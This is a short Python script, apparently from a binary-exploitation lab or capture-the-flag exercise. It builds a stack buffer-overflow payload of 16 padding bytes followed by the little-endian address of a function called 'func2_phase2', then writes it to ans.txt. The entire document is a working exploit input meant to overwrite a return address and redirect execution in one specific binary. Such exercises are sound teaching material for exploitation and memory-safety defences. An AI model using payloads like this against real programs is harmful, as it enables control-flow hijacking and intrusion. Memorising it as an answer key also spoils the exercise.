padding = b"a" * 16
func2_phase2 = b"\x4c\x12\x40\x00\x00\x00\x00\x00"
payload = padding + func2_phase2
with open("ans.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")